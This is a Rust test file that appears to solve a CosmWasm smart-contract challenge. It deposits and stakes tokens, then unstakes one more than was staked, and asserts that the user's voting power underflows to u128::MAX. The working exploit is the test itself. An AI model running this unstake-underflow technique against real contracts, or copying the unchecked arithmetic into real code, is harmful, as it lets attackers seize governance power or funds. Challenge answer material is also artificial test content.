// cargo test --release -- exploit::exploit::exploit --exact --nocapture

#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::{DENOM, LOCK_PERIOD},
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";
    const INITIAL_AMOUNT: Uint128 = Uint128::new(1_000);

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {};
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        app = mint_tokens(app, USER.to_string(), INITIAL_AMOUNT);

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let player = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            player.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(INITIAL_AMOUNT.u128(), DENOM)],
        )
        .unwrap();

        let msg = ExecuteMsg::Stake {
            lock_amount: INITIAL_AMOUNT.u128(),
        };
        app.execute_contract(player.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // normal stake
        let msg = ExecuteMsg::Unstake {
            unlock_amount: INITIAL_AMOUNT.u128() + 1,
        };
        app.execute_contract(player.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        println!("voting_power: {}", voting_power);
        assert_eq!(voting_power, u128::MAX);
    }
}
